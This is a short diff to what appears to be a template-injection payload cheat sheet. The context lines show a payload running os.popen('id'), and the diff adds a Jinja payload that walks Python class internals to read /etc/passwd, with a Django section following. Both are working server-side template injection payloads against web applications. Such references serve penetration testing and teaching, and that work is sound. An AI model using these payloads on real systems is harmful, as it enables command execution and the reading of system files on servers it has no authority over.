@@ -86,6 +86,11 @@ x=os.popen('id').read()
 ${x}
 ```
 
+#### Jinja
+```pyhon
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+```
+
 #### Django
 Explore the enviorment with
 ```python
